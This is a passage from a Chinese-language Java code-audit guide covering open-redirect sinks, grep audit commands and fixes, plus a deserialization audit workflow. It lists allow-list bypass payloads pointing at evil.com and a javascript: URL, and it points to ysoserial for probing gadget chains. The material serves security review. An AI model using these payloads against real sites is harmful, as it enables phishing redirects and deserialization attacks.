  - Thymeleaf 3.1+ 默认禁用表达式注入
  - 业务侧禁止用户可控 fragment 参数
  - 配置 spring.thymeleaf.servlet.produce-partial-error-while-processing=false
```

### 17. URL 跳转漏洞（实战补充）

```
常见危险 sink：
  - response.sendRedirect(url)
  - ModelAndView("redirect:" + url)
  - response.setHeader("Location", url)
  - ResponseEntity.status(302).header("Location", url).build()

审计 Grep：
  grep -rnE "sendRedirect|setHeader\(\"Location\"|\"redirect:\"" --include="*.java"

绕过白名单（白名单只检查前缀）：
  - http://evil.com#@trusted.com
  - http://trusted.com.evil.com
  - //evil.com                    → 协议相对 URL，浏览器会跳到 evil.com
  - javascript:alert(document.domain) → IE/旧版 Edge
  - \\\\evil.com                  → 反斜杠，部分容器解析为 evil.com

修复：
  - 使用 java.net.URI 严格解析，禁止相对协议
  - 业务层维护 redirect 白名单 Host
  - 配置 Spring Security addHeader(HttpFirewall) 拦截非常规 Host
```

### 18. Java 反序列化实战经验

```
1. fastjson autoType（详见 P-服务攻防/java-framework-vulns.md）
2. shiro-550 / shiro-721（同上）
3. log4j2 JNDI 注入（同上）
4. struts2 OGNL（同上）

通用审计流程：
  grep -rE "ObjectInputStream|readObject\(|XMLDecoder|XStream\(" --include="*.java"
  grep -rE "fastjson|jackson|gson|XStream|hessian" pom.xml
  → 找到入口后，检查 Content-Type: application/x-java-serialized-object
  → 对外暴露的 @RequestMapping @PostMapping，反编译检查入参类型
  → 使用 ysoserial 探测 gadget chain
```
